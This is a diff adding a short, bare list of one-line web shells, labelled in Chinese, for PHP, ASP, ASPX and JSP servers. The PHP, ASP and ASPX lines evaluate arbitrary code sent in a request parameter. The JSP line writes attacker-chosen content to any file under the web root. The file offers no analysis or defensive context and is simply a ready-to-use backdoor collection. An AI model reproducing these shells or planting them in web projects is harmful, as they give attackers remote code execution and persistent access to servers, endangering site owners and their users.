@@ -1,0 +1,12 @@
+php一句话木马
+<?php @eval($_POST["shell"]);?>
+
+asp一句话木马
+<%eval request("shell")%>
+
+aspx一句话木马
+<%@Page Language="Jscript"%>
+<%eval(Request.Item["shell"])%>
+
+jsp一句话木马
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
